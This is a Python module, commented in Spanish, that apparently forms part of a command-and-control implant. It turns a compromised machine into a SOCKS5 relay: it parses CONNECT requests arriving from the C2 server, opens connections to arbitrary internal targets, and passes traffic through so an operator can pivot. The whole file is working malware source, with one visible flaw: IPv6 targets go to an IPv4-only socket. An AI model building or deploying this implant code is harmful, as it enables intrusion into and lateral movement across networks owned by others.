"""Módulo SOCKS proxy para el implant C2.

Permite al implant actuar como relay de tráfico SOCKS5,
habiilitando pivoting a través de la máquina comprometida.
"""
import socket
import struct
import threading
import time


# SOCKS5 constants
SOCKS5_VERSION = 0x05
SOCKS5_AUTH_NONE = 0x00
SOCKS5_AUTH_USERPASS = 0x02
SOCKS5_CMD_CONNECT = 0x01
SOCKS5_ATYP_IPV4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
SOCKS5_ATYP_IPV6 = 0x04
SOCKS5_REP_OK = 0x00
SOCKS5_REP_CONN_REFUSED = 0x05


class SOCKSClient:
    """Cliente SOCKS5 que opera a través del canal C2."""

    def __init__(self, c2_url, auth_token, agent_id):
        self.c2_url = c2_url.rstrip("/")
        self.auth_token = auth_token
        self.agent_id = agent_id
        self.channels = {}  # channel_id -> socket
        self.running = False

    def handle_socks_request(self, data):
        """Procesa una solicitud SOCKS5 desde el servidor C2.

        Args:
            data: Datos SOCKS5 codificados en bytes

        Returns:
            Respuesta SOCKS5 en bytes
        """
        try:
            if len(data) < 2:
                return self._error_reply(SOCKS5_REP_CONN_REFUSED)

            version = data[0]
            if version != SOCKS5_VERSION:
                return self._error_reply(SOCKS5_REP_CONN_REFUSED)

            command = data[1]

            if command == SOCKS5_CMD_CONNECT:
                return self._handle_connect(data)
            else:
                return self._error_reply(SOCKS5_REP_CONN_REFUSED)

        except Exception as e:
            return self._error_reply(SOCKS5_REP_CONN_REFUSED)

    def _handle_connect(self, data):
        """Maneja solicitud CONNECT SOCKS5."""
        try:
            # Parse address type
            atyp = data[3]

            if atyp == SOCKS5_ATYP_IPV4:
                if len(data) < 10:
                    return self._error_reply(SOCKS5_REP_CONN_REFUSED)
                addr = socket.inet_ntoa(data[4:8])
                port = struct.unpack("!H", data[8:10])[0]
            elif atyp == SOCKS5_ATYP_DOMAIN:
                domain_len = data[4]
                if len(data) < 5 + domain_len + 2:
                    return self._error_reply(SOCKS5_REP_CONN_REFUSED)
                addr = data[5:5 + domain_len].decode()
                port = struct.unpack("!H", data[5 + domain_len:7 + domain_len])[0]
            elif atyp == SOCKS5_ATYP_IPV6:
                if len(data) < 22:
                    return self._error_reply(SOCKS5_REP_CONN_REFUSED)
                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack("!H", data[20:22])[0]
            else:
                return self._error_reply(SOCKS5_REP_CONN_REFUSED)

            # Intentar conexión
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            try:
                # Resolver dominio si es necesario
                if atyp == SOCKS5_ATYP_DOMAIN:
                    addr = socket.gethostbyname(addr)

                sock.connect((addr, port))

                # Respuesta de éxito
                reply = struct.pack("!BBBB", SOCKS5_VERSION, SOCKS5_REP_OK, 0x00, SOCKS5_ATYP_IPV4)
                reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)

                # Guardar canal
                channel_id = f"{addr}:{port}"
                self.channels[channel_id] = sock

                return reply

            except (socket.error, OSError):
                sock.close()
                return self._error_reply(SOCKS5_REP_CONN_REFUSED)

        except Exception:
            return self._error_reply(SOCKS5_REP_CONN_REFUSED)

    def _error_reply(self, rep):
        """Genera respuesta de error SOCKS5."""
        return struct.pack("!BBBB", SOCKS5_VERSION, rep, 0x00, SOCKS5_ATYP_IPV4) + \
               socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)

    def relay_data(self, channel_id, data):
        """Envía datos a través de un canal SOCKS abierto."""
        if channel_id in self.channels:
            try:
                self.channels[channel_id].sendall(data)
                return True
            except socket.error:
                self.close_channel(channel_id)
        return False

    def receive_data(self, channel_id, buffer_size=65536):
        """Recibe datos de un canal SOCKS abierto."""
        if channel_id in self.channels:
            try:
                self.channels[channel_id].settimeout(0.1)
                return self.channels[channel_id].recv(buffer_size)
            except socket.timeout:
                return b""
            except socket.error:
                self.close_channel(channel_id)
        return b""

    def close_channel(self, channel_id):
        """Cierra un canal SOCKS."""
        if channel_id in self.channels:
            try:
                self.channels[channel_id].close()
            except:
                pass
            del self.channels[channel_id]

    def close_all(self):
        """Cierra todos los canales."""
        for channel_id in list(self.channels.keys()):
            self.close_channel(channel_id)
